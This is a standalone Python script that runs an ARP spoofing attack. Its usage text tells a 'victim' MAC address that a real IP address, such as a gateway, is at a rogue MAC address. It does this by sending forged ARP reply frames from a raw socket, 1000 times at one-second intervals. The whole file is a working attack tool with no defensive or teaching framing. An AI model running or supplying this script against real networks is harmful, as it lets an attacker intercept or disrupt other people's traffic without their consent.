#!/usr/bin/python3

import sys
import time

if len(sys.argv) != 5:
  print("Tell victim_mac_address that the real_ip_address is at rogue_mac_address through interface_name")
  print("%s interface_name victim_mac_address real_ip_address rogue_mac_address" % sys.argv[0])
  print("")
  print("  Example:")
  print("  %s eth0 ffffffffffff 192.168.0.254 0bc5175c9775" % sys.argv[0])
  print("  will broadcast that 192.168.0.254 is at 0b:c5:17:5c:97:75")
  sys.exit()

import socket

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((sys.argv[1], 0))

dstmac = sys.argv[2]
srcmac = sys.argv[4]
ethertype = "0806" #arp
hardware_type = "0001" #Ethernet (1)
protocol_type = "0800" #IP
hardware_size = "06" #Size of hardware addresss, 6 for ethernet
protocol_size = "04" #Size of protocol_type address, 4 for IP
opcode = "0002" # 0001 for request, 0002 for reply
sender_mac_address = srcmac
sender_ip_address = sys.argv[3]
target_mac_address = dstmac
target_ip_address = "255.255.255.255"

payload = ( \
          bytes.fromhex(dstmac), \
          bytes.fromhex(srcmac), \
          bytes.fromhex(ethertype), \
          bytes.fromhex(hardware_type), \
          bytes.fromhex(protocol_type), \
          bytes.fromhex(hardware_size), \
          bytes.fromhex(protocol_size), \
          bytes.fromhex(opcode), \
          bytes.fromhex(sender_mac_address), \
          socket.inet_aton(sender_ip_address), \
          bytes.fromhex(target_mac_address), \
          socket.inet_aton(target_ip_address), \
          )

for unused_var in range(1000):
  bytes_sent = s.send(b"".join(payload))
  print("%i packet sent" % bytes_sent)
  time.sleep(1)

exit(0)
